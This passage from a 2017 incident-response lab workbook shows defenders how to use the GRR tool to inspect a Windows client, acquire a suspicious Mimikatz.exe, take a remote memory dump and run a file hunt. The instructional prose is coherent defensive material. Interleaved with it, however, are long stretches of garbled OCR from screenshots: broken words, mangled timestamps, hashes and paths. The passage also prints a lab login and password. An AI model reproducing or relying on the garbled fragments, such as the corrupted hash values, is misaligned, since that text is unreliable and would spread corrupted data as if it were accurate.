o Username: .\student-localadmin o Password: sec599 In an enterprise environment, you could of course easily deploy this binary using GPO's.

272

© 2017 Erik Van Buggenhout & Stephen Sims

C <D 192.168.30.16 ,oo ~/manaq~t,,,,.,...,

e

D X

., *

G,GRR

2011-01! 17 16 4'3 19 Ul C

MAJIAC.lll!S:lfl
QanJob~ Hum~

-COflll)OllOOl'J
exeartabjes

.!. ~
11---s.,.-,-.-,,1
kon HIIM - - - - · · typo

DetaUs

0

how~<=

jU WIIIX

Stan~Ao,n
Ad,anc:6(1. CONflC.tmATIOII

......... r · - ~ ..tndowl ~ agen1up,

GRR.3 1 0 2_amd64 · ·· GRR. 3 1 0 2_i386 ext

GRRSignedBlob GRRSigne<l31ob

2017-07-27 18 50 53 2017-07-27 18 50 45

,......

I

dbq_GRR_3 I 0 2_,md6J o,.e GRRSig,\tdBlob dbg_GRR. 31 0 2_1386 ex~ GRR5i?nedllob

2017-07-27 18 50 57 2017-07-27 18 50 48

,,.....

4. Confirm GRR installation - search clients again

The easiest way to confirm the successful installation of GRR is to search for clients

again. Give the background installer a bit of time (let's say 1 minute) and search

GRR again with an empty value in the SearchBox. You should now see that one

host was added!

f-

C © 192.16830.16,000 *'sureh

f8 _ . _ . ... '(" C..c_S.,,,,_ D Sr,pl,s·Ew.wo,.... [J Kceno -' ,......,. ti ...,....,iodge< · MISI' m

@GRR

lls<!f'admin

2017-0!). 1716 ~I 4S UTC

8
G,R-.i,r,,nC-t

D X
*

MA· A<ll.MDlT
C,an Job V,ewa tt.rJ Maoag@ ~Stri31ics SW\Glob&lfk>M Advar..ced ·
IGIIRA.'lCII

Online Sobjecl

Ho$t

OS "-'*ion MAC

Usemames First Seen

unsforens.c.t

@ C 3<1)2t067bd>9"8a6 WINOOWS02 10 0 14393SP0 00 15 !id 02 20 22 ·~Int ·~· u,y

2017-09-17 16 50 J7 UTC

Ad,n-,iloUtor

Arlifact Man11Q1<

I

API Help R- 11 probkun

5. Open "WINDOWS02" client

Upon clicking the client entry, you will land on the "client page" in GRR. The "client page" provides a summary view of the client. This includes the following

© 2017 Erik Van Buggenhout & Stephen Sims

273

information:

o OS version

o Date/ time

o Users on the system

o Network interfaces
You can also click "Full Details" (right of the screen), which will provide additional details on the host on which GRR is installed. This includes for example the environment variables.

e

j

G'IR Adm"' Conso~

X

~

C (I) 192,168.3016&Xlf ·

~ r,· °"'~

-,a.og., · f!'.i' -

f ,..,. '< Cunoa Saoclix;, D S..,,,!M' ·~ CJ ...,.,_. 1'.s"" D

MISP

m

(;, GRR

lJ·M ·dm"1

20110917150309UTC'

<;

1:~~2,~com

S (i) 26teeM0$8

W INDOWS02 s1092041ab0923Bc

A l<ltotnalPeddtllu

Version: 2017.0!>-17 U ,6 HUTC

SlffllWW(Jroww Vlrt~I Fle5-.,stm M.1nage bunched lows M.ll'lted ·
MARAC.l.11'"
(;,cnJobvi......
iu.ii·.~na;er
m-su-
frtar1 Gk>DA Rows Actnnc:,)d· CONflCiURAllOII
M·nag,, S.,llle> s.aln95
Miua~

OS
· ~ 10 10 0 14393SPO

Las1 local Clock ~ 2017~17150156UTC

GRI! Client Version

'

3102
Architecture AM06-1
Kernel 100 U393

labels No~.....ig,,ed
u....
& 1sanslor1mot$t

0 Timestamps

lnsi.llalion time 2017.02.03 03 30 SO UTC 2 c·, ·i!O

Firat Min

2017.()<;.17 IJ 56 34 UTC -.ulelt

last~ LHtMen

2017-09-17 1~ 01 56 UTC 40~ , a1JO

;:: Interfaces

If

MaeAddrou

ltllfM

Addrus. .

0 X
, *

API ~ Ropott a ~

6. Looking at "launched flows"
Flows are background activities that have been launched within GRR. This includes both activities that are initiated by the system (e.g. the initial interrogation of a new client) and activities initiated by the end-user (e.g. the request to acquire a remote file).
As GRR can sometimes be a bit tricky to understand the status of an action, the "Manage launched flows" is a good place to come and analyze the state of background activities.

274

© 2017 Erik Van Buggenhout & Stephen Sims

e

· X

r-

~,r,--£-.. t-

C (!) 192.168.30.168000/·/ctients/C.Jdt>lc067bcb9e8.1o/llow'./

'l? Pfx-r--~ '< ,...- - . a

I] -

,.._, D -.,~, ,..,SP CTf Go;u.,....c.,._c

* :

~GRR User·-

2017-0').17 16 58 ).! I/TC

l'VINOOVl$021y11t1tchlltbs c.om '>IAlus (j4)911Cl>nds"90 A lnlerna IP addtVS5
Hostlnfonnalion SLll'I,_~ S,o.wse Vr1ualF~

·.·

Flow Name

H CIE748f7 hunt ln1"'1<>gale

fl? E EIF72O60

lnt8ffoga1e

fl? E 292ECB81

CrHIJOn Time

lnlAcl,ve

CrNlOf

2017-0917165050UTC 2017-09-171651531/TC GRRWoncer

2017-09-17 16 SO 48 UTC 2017-09-17 16 51 01 UTC GRRWOti<er

2017.09-17 16 50 47 UTC 2017--09-1716 50 47 IITC GRRWor""'

Ad>arad ·

~I

r

Cu,n Job Viewor

Hlllll!.~

Shew~

SlartGlobalAo,r.,

Advan<ed ·

CONflliUl>AllOW

t.bnag· Bina<les

API Help Repon I problem
7. Browse the client filesystem
Let's start doing some work on the client! You can use the "Browse Virtual Filesystem" function (included in the menu to the left).
In the next window, click the following structure: "fs" -> "os" -> "C:". This will
allow us to further explore the C:\ directory of the target host. Note that GRR will not automatically load all folders & files, you need to manually click the "Refresh" button to collect this information.
From this screen, you can explore the file system, but also select files / folders that you'd like to download (or "acquire").

© 2017 Erik Van Buggenhout & Stephen Sims

275

e

· X

\,.,' GAA Adm11, (Of"'li,Oo&

X

~

C (D 192.1683016

· e -s/C.67 204 abO'ld8cM , o~s;;,a,,

'"°°°s..-ooo, '6' X P!St"W.,......

D s.-np1os · - - (] 1(A)a,\o

""""' D - ..~

MrSP

m

G~R l\d,..., n (Of'J,O,t

., *

~GRR

1017-09-17 I~ 10 23 uTC

Q. 0

(j

WlNOOWSC2 S)'nctochlabs con, St.tu>(t2l&OCO<ld.

It M C

z ~ t> 0

A,

IPaddrns

Icon Name

· rype

Heil~ S1a<1 new flows
MMlage laanched..,... Mv·nced ltAJi4GOOEJ< c,onJooV'tlunl Mlnaget S-Star=s S-Globalfbn A<h'erad -
OHl'IGIJRATlOH
M,111,ge Bir.,_ ~ AltifHI I.IOM9er

..; l"9ISII) - st.its

$Recycle B,n VfSOi:actory O 4096

600TNXT

VFSFI·

0

I

I

BOOTSECT BAK VFSAe

O 8192

2C17-09-17 074130
201&-07-16 114300
2017-02-03 03 23 36

l01&-07-16 11 47 47
2016-07-16 125819
1017-02-03 03 23 36

2017-09-171SOS 2 2017,b-17 15 08 2 2017-09-17 15 08 2

aff4:/C 67092041ab09238c/fs/os/C:@ 2017-09-17 15:08:21

Value,

VFSOU~lO,Y

Palhl1p«

OS

+

o ....

")A<1'lnQ t'r tCf'IO'l,

8. Downloading files from remote system (1)
So, let's try downloading files from the remote system. This could be useful during forensics work, if you'd like to acquire suspicious files that you can then further analyze.

Imagine that you've noticed an "anomaly" from your OSQuery dashboards in ELK (which you created in the last lab) and you've narrowed it down to the following file:

C:\Users\nick.fury\Desktop\Mimikatz\x64\Mimikatz.exe

In case it's called Mimikatz.exe, you could already guess what's going wrong... But just to be sure, let's acquire the file so we can further analyze it. Let's try getting this file using GRR:
o Click "Browse Virtual Filesystem"
o In the new windows, expand "fs" -> "os" - > "C:"
o In the right-hand window, double-click "Users"
o In the "Users" directory, click the "Refresh Recursively" button (the refresh button with an "R")
o Configure the "Max depth" to 8
Wait a bit for the Refresh to succeed. GRR will pop up a message indicating the download worked (and the blue square in the top right-hand corner will change from "O" to "1" with a red color).

Once you've seen the message/ the red square, please continue down your path:

276

© 2017 Erik Van Buggenhout & Stephen Sims

,,..
o Double-click "nick.fury" o Double-click "Desktop" o Double-click "Mimikatz" o Double-click "x64" o Click mimikatz.exe

e

D X

f-

C (l) 192.168.30.16!000 · dttntsJC.67092041ab09238c/l,Wf os/C%2SWUsers/no::ldury/l)Hk1.:,pJMim,k>1~

* Q.

,....
,-.
,.... ,.... ,.... ...... ,....

fa' P!Sfflscr,,_,, X CockooSrdbo> [) Somp;es·E~ [J -

 ~R .,,.._

-. -....- ........ - ..... -.e.._u_.,-..,

_. .,../M

..

--...·.-...- ----- ... -,-..

~ ....

"""'' [) ~ , MISI> Clf G~·Ao"'"'C°"""t

., .. ., .,.,., ...,.

Q. e>

·

_...,.

_,.,_ w.·--

21»".ac,Nzs~ :O-W·.;:r,s4·.JI)

Xl''"--06-Cl(.(l;.l!~;

» J~9 ,06.CH1·+!

:11·-»111·eoi:!

20"·.Qt(Jot-:!.-~ .:rn·;iu10.-c.1:.

23· ·.o;.,,- ,.. ~):

--_-.-._-...,_._
-__,_,

-·- ..o. ..... aff4 ,C 67092041ab09238clfs.'o~,c /Usersmick fury!Desk1op!Mu111k.ltz,x64 m1111,katz exe @ 2017-09... 17 15 56 32 .... ,.._ - ... f...... cs ............. :.......~~-...-..n--- ~~

·-

.a!-l ":~-t~ae.:..-..nol.)~·IIIMDW'111 ,..,_._
~

9. Downloading files from remote system (2)
Below the directory listing, you will notice another window with the following tabs:
o Stats
o Download
o TextView
o HexView
Please click the "Download" tab and then click "Get a new Version". This will prepare the download for you! As before, you'll have to wait for the completion message, or the blue square in the top right corner to become red (or if the square is already red, wait for the number in red to increase).

Once the button becomes red (or the number in red increases), it means you have an "update". Please press "FS" to hard refresh the web page. Click the relevant file again, select the "Download" tab and click the "Download" button and your download should start.

Again, GRR's interface can sometimes be a bit of a pain (and you could argue that

maybe it deserves some extra attention...), but the tool itself is highly powerful and

without any license cost.

© 2017 Erik Van Buggenhout & Stephen Sims

277

e

a x

~

C © 192.168.3016SOOO · .

·09 Q.11.at,0;

cs,IC%,>S ..,,.-..,1n,cJlury~ ft,lmitr.t">64

Q *

~ P&,,.f,_. '<" CuoooSonobo, Cl s.-,,,,IH·iv,lwd,se [J -

,...,,... Cl ~ , , ,. ~·is· CTF e,,~..,,,..c.,,,..,,·

------ -·
----------·.,......,_
----r..,,..

.

.....,..
~ .....

--.. .. _......................,...

- - - ·-· ....

_...,
.

'"SF'·

--... ... .._

1111... 14'1!

.,.
= ...
mt< J.a.s·,

""·..~
··.oa.a:-...a~· 1 0 1 1 . . 0 U l ~ :a~· =·~:t..H"''

IW.__C:..... :, s.c,,-: ~ ', 3::
,Ot,.-.H,u-,JII

... jOU.,G.t'" t!,e S2
ax:-..'"9-:: ,,0:21

... c,
.. c.-
. """°

aff4 C 67092041ab092l8c·s oslC "Jsers·n,ck fury Desktop.M,.,,,katzx64 m,mfl<atzexe -..,i...,.........,. --0~ ....oe- CU:::~fMIY' 4 1 ~ ~ - - - ~ - ~ ~'.'!l)f,·1~----·"il ..-n-0~ ~·lbS,·!li,ett:=aec>··:~·I ~ ~ · ~ ~ t : · ~ ...-.:..0-,-
,...._.,.,,,...,. ~1IQI ? , . - , . . ~ , . ~ ~ ~ l&~.,;.c--,.o..··te=~

·-

Ge......\ ....

10. Generating a remote memory dump
So let's use GRR to perform a remote memory acquisition! Remote memory dumps are part of the "flows" in GRR. Let's open t he "Start new flows" function. The type of flow we want to open is "Memory"-> "Memory Collector".

There is no need to adapt any of the settings, we can just run it by clicking "Launch". Upon clicking the "Launch" button, GRR will show you a new window indicating the MemoryCollector flow was launched. Again, you'll need to wait until the blue square becomes red (or the number in red increases), indicating a new event has been registered.

Now go and grab a coffee, generating the memory dump might take a few minutes. In the mean time, feel free to browse the GRR interface further... You can wait for the alert, but in the "Manage launched flows" menu, you will also see a flow with the name of "MemoryCollector". The clock icon in the State means it is still running ...

278

© 2017 Erik Van Buggenhout & Stephen Sims

8
GAA Ad,,..n Co,,,o,. x

f-

C Q) 192.168.30.16

· clte11t>/CEa~!Cb1c0al)r.ow--..,1

'8 PfSo,,w~,_..i V:: wdcooS- D -

--

CJ l(.,bono

D Nftll.<S

~ON)iodgo, · MIS·

CTF

(i'lUc.....,c-

~ GRR

2017-091718 01 J6 lfTC

D X
*

WIND0WS02 ·1nc:lochlabs com Slalld 8 20Hcond ego

A

Padd:eat

Advanced ·
IU.!IM.[MU<l
Cron Job v;..,...
I-M'IIM·nage,
S-Slnslics Slir1Globalf"""1, Advanctd ·
CON IGURATION

Scare Path

0

F1i2F08C

<:?

H C4E74Bf7 hunt

,:? t E 75116343

Flow Name Memor,Coll.td01 lnterrog11e

c,..,lon nme

Las1Ac:11vt

CrNIO<

2017-09-171759~UTC 2017-09-17180110lfTC Id-'

2017.09- 17 17 57 12 UTC 2017.09-17 17 57 30 l/TC GRRWofkar

2017-09-1717 57 12 UlC 2017-09-1717 57 26UTC GRRV-lori<H

20 17-09 17 17 57 12 UTC 2017-09-17 17 57 12 UTC GARWO<br

API Help Re;,on a prolllMI
11. Downloading the memory dump (1) Once you see the red square, let's try downloading our memory dump. Given the size of the file and the effort involved, it's possible you'll need to hard refresh the GRR window before taking this next step.
To download the memory dump, take the following steps: o Click the "Manage launched flows" button in the menu to the left o In the window to the right select your memory dump by clicking it o In the menu below, click the "Results" tab o In the "Results" section, click the Output link that is present (it should start with "aff4:/" and the filename should be "output.aff4"

© 2017 Erik Van Buggenhout & Stephen Sims

279

,..

GRR Adm1n Coo'°'4e

><

C <D 192.168.30.16

Q,GRR

N.,..,, D t,o,,eyil>dgot y MISP

Cir

2 1 09-1 1809~0VTC

e

· X

*

WINOOWS02 synctocnlaM ,;om
Stalll1 'ii) .o ..conds 1190
· lntP.m.l IP acldm>a

 Stace Path

Flow Name

Creation Time

LasrAcuve

Creator

Host lnf01ma·oon

<:1 F62F08C

MemoryCorlador

2017-09-17175925UTC 2017..()9 17 18 04 38 UTC adrnon

Startn-ewllow$ Browse Vinual F~,-sw11

<:1 H CAE74BF7 hunt Interrogate

<:1 E 751163-13

lntatrogate

2017-09 17 17 5712 UlC 2017--0917 17 57 30 UTC GRRWorlcer 2017-09-1717 5712UTC 2017-09-1717 57 26 UTC GRRWori<e<

Advanced·
""NAG£Jrt.1.'l Cron Job Vl'fflef hun! Manager

1,-<:1 E 2852CA9C

CAEnroler

2017-09-17 17 57 12 UTC 2017,09-1717 5712 UTC GRRWofller FIiter

r

Shcv, ~s,=

V3lue

Sta<t Glaea F~,,s

f:'~)'19·~

"' ·c 2· .... " blc0.1/lemplC I\Vlnd:M~~r,l2 GRR/'l 1 0 2lTempiOUlpo~~~4

CO~·IGUIIATION

f:'·~'11.IY~· Im<wa(l)Sl

ROFURN 2017-09-171804'38 UTC

·.1anaga~

<;~ "'1tnad. t.·iln·gt!'

I I Fir..t Pn.,,,1ous

Next Last

API He/µ Report a prabkm1

12. Downloading the memory dump (2)
In the next window, you will be brought back to the filesystem structure (in temp), where our file is available for download. In the menu below, click the "Download" tab, after which you can also click the "Download" button to start downloading your memory dump.

This memorydump can subsequently be used to perform follow-up forensic investigations!

p-GR.RAdminConsole >c

~

C CD 192.168.30.16 ° · """ts.lC23atOa~dfOb1® ..,.,

'8

'< F.-...v..:i

D Cud:oo Sondbo,

s.,,,pi... Ewmb... [J · · -

C"-253AJW,~dOW1/Syswml ~, NO<SUS [l llon<-ftod9·· · MISP

. '

"

CTF

e
GAA Adm.in COMO.'~

· X
*

Usor 11dno.n

2017 J917 81119 UTC

Se.irct, Bo

ctO

@

WlNOOWS02 s;nele<hla«>s com StalUS ~17r~ogu
,- tnwna IP addr855
H.o&l lnkirmation Start ne,, fiows
Manage launched"°"'

,J analysis «:,) r.
reglsll)'
.J Slats

· Icon Name

type

.,..

3102

np

;: ~ t? 0

stat..st_slu star.st_mnme stat.st_cdm1 Age

temp

·

C

..__ -- w,

oulj>UI aff4 VFSBlobfmage 1209650427 1209650,27 2017-09-17 2017-09-17

18 01 09

18 00 46

2017,09-17 18

Alk.lnC'i'd .
IIIANACOC[II!
C,on Job Viewe, Hoot Ma<-aii~ Show Stali.wcs

l

Download

Slall Global Fto"s Advar.ted ·

aff4:IC.23af0aedf0b1coa 1/temp/C:/Windows/System32/GRR/3.·

CONflo'..I.RATION Manag· 6,iaries 5a'bngs MfJctMat'IA;l«

·-

Hash was 1MSSa9e Hash { mdS HashDigest 70e6c6937a561a270I07dd11df698826 sha1 HashD,gest 26d1867fdbd62c83a9471bac5875S4121969b751 sha256 HashOige.t a890284fa3aeac.ba7e161a577c10M2caolf0fa3877a26S9956!4e55449wll27 J A£ downloaded on 2017-0!1-17 1809 56
API H,,lp R~po<t a probl<m

280

© 2017 Erik Van Buggenhout & Stephen Sims

13. Using GRR's Hunt Manager
A third and final function in GRR we'd like to highlight is the "Hunt Manager". Within GRR, we can also use a hunting function that can be used to search all connected clients for certain conditions.

Hunts can be scheduled to run regularly, or can just run as a one-off. Image we know that a particular piece of malware hides itself in the "C:\windows\system" directory. We can easily deploy a hunt to obtain a full overview of all clients!

Let's open the hunt manager by clicking the "Hunt Manager" in the menu on the
left, after which we can click the "+" button to add a new hunt.

GAA lldmm Co,,,oie x

t-

C <D 192.168.30.16 a<Nl0f·/h~n,

8

0 X

* :

New Hunt - What to run?

l I .J Admlnistrat,
- -... 8rowS£rr _ Chetks
1- _ Coff8CI011i

Pleosa selea · flow from lhe l!ee on Ille !ell

i-1 ..J F1leTypes 4.1 Filesystem

t ij MemO<)' Networll

·

14. Selecting &amp; configuring the File Finder The hunt type that we are interested in is the "File Finder", which you can find under the "Filesystem" directory. We will set the following options for the hunt:
o Path: "C:\ Windows\system\* "
Once configured accordingly, please click "Next", "Next", "Next", "Create Hunt" and "Done" (we won't specify any output types or conditions related to what clients the hunt needs to run on).

© 2017 Erik Van Buggenhout & Stephen Sims

281

New Hunt - What to run?

.,; Aid"""-""lnl··
.J!voWH·

·

F1leF1nder

.Jc,..-u

+

F ·-1:>t'i

~,. F"t'ICle·
G.t\·S:J
t--·J.11.'o ....,..5, ..I~,.~..,
·-'-,d Nt~·Ot<" .J P·OC.UH -J R..,s")

m

15. Launching the hunt
By design, GRR does not launch the hunt automatically upon creation. In the screen that is returned upon creation of the hunt, please select the hunt and press the "PLAY" button to start the hunt. A window asking you for confirmation will pop up, where you can confirm you want to start the hunt.

Once the hunt is running, you will notice that the hunt is displayed with a "clock" icon, indicating it is currently running. The hunt will likely take a few minutes, which is again a perfect timing for a small coffee break!

You might think this is a lot of overhead for a simple directory listing... Consider however that there is some overhead GRR creates to launch the hunt, but that all clients afterwards come back individually with results. This type of lookup thus scales well in large environments!

GAA Admin Consolt

k

8

D X

C (l) 192.168..30.16 oOUO ·/hunts/fi:7DOFSS1'l/

*

(;, GRR

Such&.

Q 0

WIN0OWS02 s1'11{.lechlabs com ~ ~ 2 minutes ·9" #, lnrrm.tl IPaddrtl$3
Host 1nformo!lon SIMl MWflow· 6'.r,·,se V,nual Fo,,sl'1Cl'lfll t~nag'-' l.unth,,-d IIOW'S AdvanNd· llA!iAGCMI I< Cron Jeb Viev,-.,

+

· 0

S111u1 Hunt ID

Home

Stanllme

Expires

Cli<?nl Lbnil C11111Dr Description

0 hunls/H 700F5519 Genenctiuni 2017-09-17 182315 VTC 2017-10-01 18 24 45 VTC 100 admln Fiieflnder

ShowSta:;s·k:; Stan Global Flo-ns
Act«1r.c~ -
coNFKxl8Arl!III Mar1a9· &,llfiu

Name Hunt ID Hunt URJI Creator
Stan rrme Expiry rnne
Stotus Client limit

GeneticHunl H 700FSS19 aft~ lhunt<IH 7O0F5519 adrnitl
2017-09-17 18 23 15 UTc 2017-10-01 18 24 45 UTC STARTED 100

282

© 2017 Erik Van Buggenhout & Stephen Sims

16. Reviewing hunt results
Once the hunt is running, you can periodically check it for results. Note that a hunt does not need to fully finish before we can review results.

Once the hunt is clicked inside the "Hunt Manager" window, we can click the "Results" tab in the bottom menu. This will provide a current overview of results of your query. In our case, after a few minutes, there should be a subdirectory called "Speech" in the C:\Windows\system directory, which you can confirm by opening the same directory in your Windows explorer.

Furthermore, you can choose to download matching files as a ZIP archive, which can facilitate further analysis.

GR~Adr11nc;on,ole X
C (i) 192.168.30,16 ·· O/"/hunWH:~E4J C4

e

D X

* Q.

( uRR

,,_,, '"

Q

fli',1..,.

Sur,~

0

-..ru-~ 1.E.tCve-Cill 0.-W.cu-f..n 20n·.co..,~ 114.55-4U""'C 201"·10.0' 15 C~-3,i:l r,,.r,'C too ~ ~ ~.,,._,

D ~l"tf:5~~ o...,...r1......_ 2ot1.oo.1~,a3rsrVTc ~r1.,c..o,,1.3,103uTe 100 ~11'1 c,rac--o.~

C "'---u.. 100Fse10 a......r,c:H.;C ~1-.00,..1'" 11.:a 1h.r~c 2'1'".t6-0111:1·c)lftC. ,110 Nnllf, c- §i=.-a.·

-·~~~Ir~·
,.,..,,,.~e,t~-L-tgi.l'

,..

°''

,.... c,.,..,

NOT£ ~ · "111..0·-r;ti-_,,OO"'.'.a.na,._IJl'lb
t,,,aw-. ~ , . ~ wc-l-1,,· iA!lt(~ ...,11Pf1'1·..,,.,..,
.Y:I ~t,~,t .,..,. 111V' ... Lt ' ~ ~·U!-9C CoOnl'a~

.·.,.....
Va l u t :

© 2017 Erik Van Buggenhout & Stephen Sims

283

'
......

